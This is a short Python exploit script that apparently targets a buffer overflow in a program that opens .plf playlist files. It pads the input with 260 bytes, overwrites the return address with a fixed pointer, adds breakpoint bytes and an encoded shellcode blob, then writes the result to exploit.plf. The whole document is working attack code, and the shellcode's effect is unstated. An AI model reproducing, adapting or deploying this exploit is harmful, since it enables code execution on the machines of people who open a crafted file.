#!/usr/bin/python
import struct

shellcode =  ""
shellcode += "\xbe\x9f\x16\x35\x11\xda\xc9\xd9\x74\x24\xf4\x5d"
shellcode += "\x31\xc9\xb1\x56\x83\xed\xfc\x31\x75\x0f\x03\x75"
shellcode += "\x90\xf4\xc0\xed\x46\x7a\x2a\x0e\x96\x1b\xa2\xeb"
shellcode += "\xa7\x1b\xd0\x78\x97\xab\x92\x2d\x1b\x47\xf6\xc5"
shellcode += "\xa8\x25\xdf\xea\x19\x83\x39\xc4\x9a\xb8\x7a\x47"
shellcode += "\x18\xc3\xae\xa7\x21\x0c\xa3\xa6\x66\x71\x4e\xfa"
shellcode += "\x3f\xfd\xfd\xeb\x34\x4b\x3e\x87\x06\x5d\x46\x74"
shellcode += "\xde\x5c\x67\x2b\x55\x07\xa7\xcd\xba\x33\xee\xd5"
shellcode += "\xdf\x7e\xb8\x6e\x2b\xf4\x3b\xa7\x62\xf5\x90\x86"
shellcode += "\x4b\x04\xe8\xcf\x6b\xf7\x9f\x39\x88\x8a\xa7\xfd"
shellcode += "\xf3\x50\x2d\xe6\x53\x12\x95\xc2\x62\xf7\x40\x80"
shellcode += "\x68\xbc\x07\xce\x6c\x43\xcb\x64\x88\xc8\xea\xaa"
shellcode += "\x19\x8a\xc8\x6e\x42\x48\x70\x36\x2e\x3f\x8d\x28"
shellcode += "\x91\xe0\x2b\x22\x3f\xf4\x41\x69\x57\x39\x68\x92"
shellcode += "\xa7\x55\xfb\xe1\x95\xfa\x57\x6e\x95\x73\x7e\x69"
shellcode += "\xac\x94\x81\xa5\x16\xf4\x7f\x46\x66\xdc\xbb\x12"
shellcode += "\x36\x76\x6d\x1b\xdd\x86\x92\xce\x4b\x8d\x04\x31"
shellcode += "\x23\x90\x55\xd9\x31\x93\x43\xb2\xbc\x75\x3b\x92"
shellcode += "\xee\x29\xfc\x42\x4e\x9a\x94\x88\x41\xc5\x85\xb2"
shellcode += "\x88\x6e\x2f\x5d\x64\xc6\xd8\xc4\x2d\x9c\x79\x08"
shellcode += "\xf8\xd8\xba\x82\x08\x1c\x74\x63\x79\x0e\x61\x14"
shellcode += "\x81\xce\x72\xb1\x81\xa4\x76\x13\xd6\x50\x75\x42"
shellcode += "\x10\xff\x86\xa1\x23\xf8\x79\x34\x15\x72\x4f\xa2"
shellcode += "\x19\xec\xb0\x22\x99\xec\xe6\x28\x99\x84\x5e\x09"
shellcode += "\xca\xb1\xa0\x84\x7f\x6a\x35\x27\x29\xde\x9e\x4f"
shellcode += "\xd7\x39\xe8\xcf\x28\x6c\x6a\x17\xd6\xf2\x45\xb0"
shellcode += "\xbe\x0c\xd6\x40\x3e\x67\xd6\x10\x56\x7c\xf9\x9f"
shellcode += "\x96\x7d\xd0\xf7\xbe\xf4\xb5\xba\x5f\x08\x9c\x1b"
shellcode += "\xc1\x09\x13\x80\xf2\x70\x5c\x37\xf3\x84\x74\x5c"
shellcode += "\xf4\x84\x78\x62\xc9\x52\x41\x10\x0c\x67\xf6\x2b"
shellcode += "\x3b\xca\x5f\xa6\x43\x58\x9f\xe3"

payload = "A"*260
payload += struct.pack("<I",0x616525cb)
payload += "\xcc"*48
payload += shellcode
payload += "\x90"*(2000-len(payload))

with open('exploit.plf', 'w') as PLFFile:
    PLFFile.write(payload)
